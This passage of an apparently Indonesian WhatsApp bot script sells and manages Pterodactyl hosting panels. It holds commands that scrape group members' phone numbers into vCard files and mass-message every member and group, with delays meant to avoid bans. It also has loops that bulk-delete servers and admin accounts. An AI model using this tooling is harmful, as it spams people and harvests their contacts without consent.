}, {quoted: m})
}
if (!text) return m.reply(example("server\n\nuntuk melihat list server ketik *.listserver*\ncontoh *.delpanel* 1"))
if (serverpanel.length < 1) return m.reply("Tidak ada server panel")
if (Number(text) > serverpanel.length) return m.reply("Server panel tidak ditemukan")
indx = Number(args[0] - 1)
let egg = serverpanel[indx].egg
let nestid = serverpanel[indx].nestid
let loc = serverpanel[indx].loc
let domain = serverpanel[indx].domain
let apikey = serverpanel[indx].apikey
let capikey = serverpanel[indx].capikey
if (!args[1]) {
let list = []
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply(`Tidak ada panel di server ${text}`)
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${text} ${s.id}`
})
}

return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: `List Panel Server ${text}`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(args[1]) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus panel *${capital(nameSrv)}* di server panel ${args[0]}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'clearpnl': case 'hapuspnl': {
    if (!isCreator) return Reply(mess.owner)

    try {
        // Ambil semua server dengan pagination
        let allServers = [];
        let page = 1;
        let totalPages;

        do {
            let response = await fetch(`${domain}/api/application/servers?page=${page}`, {
                method: "GET",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${apikey}`,
                }
            });

            let result = await response.json();
            totalPages = result.meta.pagination.total_pages; // Mendapatkan jumlah halaman
            allServers = allServers.concat(result.data); // Menambahkan data server ke dalam array
            page++;
        } while (page <= totalPages);

        if (!allServers || allServers.length === 0) {
            return m.reply('⚠️ Tidak ada server yang ditemukan.');
        }

        // Hitung total server
        let totalServers = allServers.length;

        // Tampilkan daftar server untuk dipilih
        let serverList = allServers.map(server => {
            let s = server.attributes;
            return `• ID : ${s.id}\n   Nama : ${s.name}`;
        }).join('\n\n');

        let teks = `*📜 Total Server Panel : ${totalServers}*\n\n` +
                   `*📜 Daftar Server Yang Tersedia :*\n\n${serverList}\n\n` +
                   `Kirim ID server yang ingin dikecualikan dari penghapusan (pisahkan dengan koma jika lebih dari satu).\n` +
                   `Contoh : *.clearpnl 123,456*`;

        if (!text) return m.reply(teks);

        // Ambil ID server yang akan dikecualikan
        let excludedIds = text.split(',').map(id => id.trim());

        // Loop melalui setiap server
        for (let server of allServers) {
            let s = server.attributes;

            // Lewati server yang ada dalam daftar pengecualian
            if (excludedIds.includes(s.id.toString())) {
                m.reply(`⏩ Melewati Server Panel Dengan ID : ${s.id}`);
                continue;
            }

            // Mengirim permintaan DELETE untuk server yang tidak dikecualikan
            let deleteServer = await fetch(`${domain}/api/application/servers/${s.id}`, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${apikey}`,
                }
            });

            if (deleteServer.ok) {
                m.reply(`✅ Berhasil Menghapus Server Panel Dengan ID : ${s.id}`);
            } else {
                let errorText = await deleteServer.text();
                m.reply(`❌ Gagal Menghapus Server Dengan ID : ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
            }
        }

        m.reply('*✅ Proses Penghapusan Server Panel Telah Selesai!*');
    } catch (error) {
        return m.reply('⚠️ Terjadi kesalahan: ' + error.message);

}
}
break

case 'clearpnl2': case 'hapuspnl2': {
if (!isCreator) return Reply(mess.owner)

    try {
        // Ambil semua server dengan pagination
        let allServers = [];
        let page = 1;
        let totalPages;

        do {
            let response = await fetch(`${domainV2}/api/application/servers?page=${page}`, {
                method: "GET",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${apikeyV2}`,
                }
            });

            let result = await response.json();
            totalPages = result.meta.pagination.total_pages; // Mendapatkan jumlah halaman
            allServers = allServers.concat(result.data); // Menambahkan data server ke dalam array
            page++;
        } while (page <= totalPages);

        if (!allServers || allServers.length === 0) {
            return m.reply('⚠️ Tidak ada server yang ditemukan.');
        }

        // Hitung total server
        let totalServers = allServers.length;

        // Tampilkan daftar server untuk dipilih
        let serverList = allServers.map(server => {
            let s = server.attributes;
            return `• ID : ${s.id}\n   Nama : ${s.name}`;
        }).join('\n\n');

        let teks = `*📜 Total Server Panel : ${totalServers}*\n\n` +
                   `*📜 Daftar Server Yang Tersedia :*\n\n${serverList}\n\n` +
                   `Kirim ID server yang ingin dikecualikan dari penghapusan (pisahkan dengan koma jika lebih dari satu).\n` +
                   `Contoh : *.clearpnl2 123,456*`;

        if (!text) return m.reply(teks);

        // Ambil ID server yang akan dikecualikan
        let excludedIds = text.split(',').map(id => id.trim());

        // Loop melalui setiap server
        for (let server of allServers) {
            let s = server.attributes;

            // Lewati server yang ada dalam daftar pengecualian
            if (excludedIds.includes(s.id.toString())) {
                m.reply(`⏩ Melewati Server Panel Dengan ID : ${s.id}`);
                continue;
            }

            // Mengirim permintaan DELETE untuk server yang tidak dikecualikan
            let deleteServer = await fetch(`${domainV2}/api/application/servers/${s.id}`, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${apikeyV2}`,
                }
            });

            if (deleteServer.ok) {
                m.reply(`✅ Berhasil Menghapus Server Panel Dengan ID : ${s.id}`);
            } else {
                let errorText = await deleteServer.text();
                m.reply(`❌ Gagal Menghapus Server Dengan ID : ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
            }
        }

        m.reply('*✅ Proses Penghapusan Server Panel Telah Selesai!*');
    } catch (error) {
        return m.reply('⚠️ Terjadi kesalahan: ' + error.message);

}
}
break

case 'clearadm': case 'hapusadm': {
if (!isCreator) return Reply(mess.owner)

    try {
        // Mendapatkan daftar semua user dengan pagination (jika diperlukan)
        let allUsers = [];
        let page = 1;
        let totalPages;

        do {
            let response = await fetch(`${domain}/api/application/users?page=${page}`, {
                method: "GET",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${apikey}`,
                }
            });

            let result = await response.json();
            totalPages = result.meta.pagination.total_pages; // Mendapatkan jumlah halaman
            allUsers = allUsers.concat(result.data); // Menambahkan data user ke dalam array
            page++;
        } while (page <= totalPages);

        if (!allUsers || allUsers.length === 0) {
            return m.reply('⚠️ Tidak ada user yang ditemukan.');
        }

        // Filter hanya user dengan peran admin
        let admins = allUsers.filter(user => user.attributes.root_admin);

        if (admins.length === 0) {
            return m.reply('⚠️ Tidak ada admin yang ditemukan.');
        }

        // Hitung total admin
        let totalAdmins = admins.length;

        // Tampilkan daftar admin
        let adminList = admins.map(admin => {
            let u = admin.attributes;
            return `• ID : ${u.id}\nUsername : ${u.username}`;
        }).join('\n\n');

        let teks = `*📜 Total Admin : ${totalAdmins}*\n\n` +
                   `*📜 Daftar Admin yang Tersedia :*\n\n${adminList}\n\n` +
                   `Kirim ID atau Username admin yang ingin dikecualikan dari penghapusan (pisahkan dengan koma jika lebih dari satu).\n` +
                   `Contoh : *.clearadm 123,username123*`;

        if (!text) return m.reply(teks);

        // Ambil ID atau username admin yang akan dikecualikan
        let excludeAdmins = text.split(',').map(item => item.trim());

        // Loop melalui setiap admin
        for (let admin of admins) {
            let u = admin.attributes;

            // Cek apakah admin termasuk dalam daftar pengecualian
            if (excludeAdmins.includes(u.id.toString()) || excludeAdmins.includes(u.username)) {
                m.reply(`⏩ Mengabaikan Admin : ${u.username} (ID : ${u.id})`);
                continue;
            }

            // Menghapus admin
            let deleteAdmin = await fetch(`${domain}/api/application/users/${u.id}`, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${apikey}`,
                }
            });

            if (deleteAdmin.ok) {
                m.reply(`✅ Berhasil Menghapus Admin Dengan ID : ${u.id} (${u.username})`);
            } else {
                let errorText = await deleteAdmin.text();
                m.reply(`❌ Gagal Menghapus Admin Dengan ID : ${u.id}. Error: ${deleteAdmin.status} - ${errorText}`);
            }
        }

        m.reply('✅ *Semua Admin, Kecuali Yang Dikecualikan, Berhasil Dihapus!*');
    } catch (error) {
        return m.reply('⚠️ Terjadi kesalahan: ' + error.message);

}
}
break

case 'clearadm2': case 'hapusadm2': {
if (!isCreator) return Reply(mess.owner)

    try {
        // Mendapatkan daftar semua user dengan pagination (jika diperlukan)
        let allUsers = [];
        let page = 1;
        let totalPages;

        do {
            let response = await fetch(`${domainV2}/api/application/users?page=${page}`, {
                method: "GET",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${apikeyV2}`,
                }
            });

            let result = await response.json();
            totalPages = result.meta.pagination.total_pages; // Mendapatkan jumlah halaman
            allUsers = allUsers.concat(result.data); // Menambahkan data user ke dalam array
            page++;
        } while (page <= totalPages);

        if (!allUsers || allUsers.length === 0) {
            return m.reply('⚠️ Tidak ada user yang ditemukan.');
        }

        // Filter hanya user dengan peran admin
        let admins = allUsers.filter(user => user.attributes.root_admin);

        if (admins.length === 0) {
            return m.reply('⚠️ Tidak ada admin yang ditemukan.');
        }

        // Hitung total admin
        let totalAdmins = admins.length;

        // Tampilkan daftar admin
        let adminList = admins.map(admin => {
            let u = admin.attributes;
            return `• ID : ${u.id}\nUsername : ${u.username}`;
        }).join('\n\n');

        let teks = `*📜 Total Admin : ${totalAdmins}*\n\n` +
                   `*📜 Daftar Admin yang Tersedia :*\n\n${adminList}\n\n` +
                   `Kirim ID atau Username admin yang ingin dikecualikan dari penghapusan (pisahkan dengan koma jika lebih dari satu).\n` +
                   `Contoh : *.clearadm2 123,username123*`;

        if (!text) return m.reply(teks);

        // Ambil ID atau username admin yang akan dikecualikan
        let excludeAdmins = text.split(',').map(item => item.trim());

        // Loop melalui setiap admin
        for (let admin of admins) {
            let u = admin.attributes;

            // Cek apakah admin termasuk dalam daftar pengecualian
            if (excludeAdmins.includes(u.id.toString()) || excludeAdmins.includes(u.username)) {
                m.reply(`⏩ Mengabaikan Admin : ${u.username} (ID : ${u.id})`);
                continue;
            }

            // Menghapus admin
            let deleteAdmin = await fetch(`${domainV2}/api/application/users/${u.id}`, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${apikeyV2}`,
                }
            });

            if (deleteAdmin.ok) {
                m.reply(`✅ Berhasil Menghapus Admin Dengan ID : ${u.id} (${u.username})`);
            } else {
                let errorText = await deleteAdmin.text();
                m.reply(`❌ Gagal Menghapus Admin Dengan ID : ${u.id}. Error: ${deleteAdmin.status} - ${errorText}`);
            }
        }

        m.reply('✅ *Semua Admin, Kecuali Yang Dikecualikan, Berhasil Dihapus!*');
    } catch (error) {
        return m.reply('⚠️ Terjadi kesalahan: ' + error.message);

}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "savekontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await conn.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer TamaOffc - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await conn.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "savekontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer TamaOffc - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await conn.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pushkontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("pesannya"))
const meta = await conn.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textpushkontak = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.respushkontak ${i}`, 
description: `${meta[i].participants.length} Member`
})
}
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Pushkontak\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "respushkontak": {
if (!isOwner) return 
if (!text) return 
if (!global.textpushkontak) return
const idgc = text
const teks = global.textpushkontak
const jidawal = m.chat
const data = await conn.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await conn.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

delete global.textpushkontak
await conn.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "pushkontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await conn.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses pushkontak ke *${halls.length}* member grup`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await conn.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

await conn.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await conn.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'jpmch': {
  if (!isCreator) return Reply(mess.owner);
  if (!text) return Reply("Teksnya?"); // Periksa apakah teks tersedia

  // Memuat daftar saluran dari file JSON
  const fs = require('fs');
  let daftarSaluran;
  try {
    daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8')); // Baca file JSON
  } catch (error) {
    console.error("Gagal membaca file idsaluran.json:", error);
    return Reply("❌ Gagal membaca daftar saluran.");
  }

  // Beri tahu pengguna bahwa proses sedang berlangsung
  Reply("⏳ Harap sabar, proses sedang berlangsung, jeda 5 menit mrnghindari kenon nomor anda...");

  // Kirim pesan ke semua saluran dalam daftar
  for (const idSaluran of daftarSaluran) {
    try {
      await conn.sendMessage(idSaluran, { text: text }); // Mengirim pesan ke saluran
    } catch (error) {
      console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error); // Log jika gagal
    }
  }
  
  Reply("✅ Berhasil mengirim pesan ke semua channel WhatsApp.");
}
break;

case 'jpmchrelay': { 
    if (!isCreator) return Reply(mess.owner); 
    if (!text) return m.reply("Teksnya?"); // Periksa apakah teks tersedia

    // Import modul filesystem
    const fs = require('fs'); 

    // Memuat daftar saluran dari file JSON
    let daftarSaluran; 
    try { 
        daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8')); 
    } catch (error) { 
        console.error("Gagal membaca file idsaluran.json:", error); 
        return m.reply("❌ Gagal membaca daftar saluran."); 
    }

    // Konfigurasi jumlah putaran dan delay
    const jumlahPutaran = 2; // Ganti dengan jumlah putaran yang diinginkan
    const delayPerPesan = 2000; // Delay dalam milidetik (2000 ms = 2 detik)

    // Fungsi untuk menunggu delay
    const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    // Mengirim pesan ke semua saluran dalam daftar dengan putaran
    const kirimPesan = async () => {
        for (let putaran = 0; putaran < jumlahPutaran; putaran++) {
            for (const idSaluran of daftarSaluran) {
                try { 
                    await conn.sendMessage(idSaluran, { text: text }); 
                    console.log(`✅ Berhasil mengirim ke ${idSaluran} (Putaran ${putaran + 1})`);
                } catch (error) { 
                    console.error(`❌ Gagal mengirim ke ${idSaluran}:`, error); 
                }
                await delay(delayPerPesan); // Menunggu sebelum mengirim ke saluran berikutnya
            }
        }
        m.reply(`✅ Selesai mengirim pesan ke semua channel WhatsApp dalam ${jumlahPutaran} putaran.`);
    };

    kirimPesan(); // Memulai proses pengiriman pesan
    }
    break; 

case 'jpmch2': {
  if (!isCreator) return Reply(mess.owner);
  
  let [jumlah, ...pesanArray] = text.split('|');
  let pesan = pesanArray.join('|').trim();
  jumlah = parseInt(jumlah.trim());

  if (isNaN(jumlah) || jumlah <= 0) return m.reply("❌ Masukkan jumlah pesan yang valid di awal teks! Contoh: 3| Halo semua!");

  // Memuat daftar saluran dari file JSON
  const fs = require('fs');
  let daftarSaluran;
  
  try {
    daftarSaluran = JSON.parse(fs.readFileSync('./library/database/idsaluran.json', 'utf8'));
    if (!Array.isArray(daftarSaluran) || daftarSaluran.length === 0) {
      return m.reply("❌ Tidak ada saluran yang terdaftar.");
    }
  } catch (error) {
    console.error("Gagal membaca file idsaluran.json:", error);
    return m.reply("❌ Gagal membaca daftar saluran.");
  }

  // Kirim pesan ke semua saluran dalam daftar sesuai jumlah yang ditentukan
  for (const idSaluran of daftarSaluran) {
    for (let i = 0; i < jumlah; i++) {
      try {
        await conn.sendMessage(idSaluran, { text: pesan });
      } catch (error) {
        console.error(`Gagal mengirim ke saluran ${idSaluran}:`, error);
      }
    }
  }

  m.reply(`✅ Berhasil mengirim pesan ke semua channel sebanyak ${jumlah} kali.`);
  }
  break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpm": {
  if (!isCreator) return Reply(mess.owner)
  if (!q) return m.reply(example("teksnya bisa dengan kirim foto juga"))

  let rest
  if (/image/.test(mime)) {
    rest = await conn.downloadAndSaveMediaMessage(qmsg)
  }

  const allgrup = await conn.groupFetchAllParticipating()
  const res = await Object.keys(allgrup)
  let count = 0
  const ttks = text
  const opsijpm = rest !== undefined ? "teks & foto" : "teks"
  const jid = m.chat

  // Buat isi pesan dengan tombol
  const pesancoy = rest !== undefined ? {
    image: await fs.readFileSync(rest),
    caption: ttks,
    footer: "alya-store",
    templateButtons: [
      {
        index: 1,
        urlButton: {
          displayText: "Chat Penjual",
          url: "https://wa.me/6287763058955"
        }
      },
      {
        index: 2,
        urlButton: {
          displayText: "Web List Apk Prem",
          url: "https://alyaa.rf.gd"
        }
      }
    ]
  } : {
    text: ttks,
    footer: "alya-store",
    templateButtons: [
      {
        index: 1,
        urlButton: {
          displayText: "Chat Penjual",
          url: "https://wa.me/6287763058955"
        }
      },
      {
        index: 2,
        urlButton: {
          displayText: "Web List Apk Prem",
          url: "https://alyaa.rf.gd"
        }
      }
    ]
  }

  await m.reply(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`)

  for (let i of res) {
    if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
    try {
      await conn.sendMessage(i, pesancoy, { quoted: qlocJpm })
      count += 1
    } catch {}
    await sleep(global.delayJpm)
  }

  if (rest !== undefined) await fs.unlinkSync(rest)
  await conn.sendMessage(jid, { text: `Jpm *${opsijpm}* berhasil dikirim ke ${count} grup chat` }, { quoted: m })
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmht": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teksnya bisa dengan kirim foto juga"))
let rest
if (/image/.test(mime)) {
rest = await conn.downloadAndSaveMediaMessage(qmsg)
}
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const ttks = text
const opsijpm = rest !== undefined ? "teks & foto ht" : "teks ht"
const jid = m.chat
await m.reply(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
let ments = allgrup[i].participants.map(e => e.id)
let pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks, mentions: ments } : { text: ttks, mentions: ments }
await conn.sendMessage(i, pesancoy, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `Jpm *${opsijpm}* berhasil dikirim ke ${count} grup chat`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "jpmtesti": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await conn.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await conn.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await conn.sendMessage(i, {
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }, 
                {
                  title: 'Jasa Jpm Pesan',
                  id: '.buyjasajpm'
                }    
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'promosi': {
    if (!isCreator) return Reply(mess.owner);

    const allgrup = await conn.groupFetchAllParticipating();
    const res = Object.keys(allgrup);
    let count = 0;
    let suksesGrup = []; // Array untuk menyimpan grup yang berhasil

    const teks = `
List Panel Run BOT WA By XYCoolcraft Store ID
==========================
        •|| [ PUBLIC ] ||•
× Ram 1GB | Disk: ∞ | CPU: 100% : Rp. 500
× Ram 2GB | Disk: ∞ | CPU: 200% : Rp. 1.000
× Ram 3GB | Disk: ∞ | CPU: 300% : Rp. 2.000
× Ram 4GB | Disk: ∞ | CPU: 400% : Rp. 3.000
× Ram 5GB | Disk: ∞ | CPU: 500% : Rp. 4.000
× Ram 6GB | Disk: ∞ | CPU: 600% : Rp. 5.000
× Ram 7GB | Disk: ∞ | CPU: 700% : Rp. 6.000
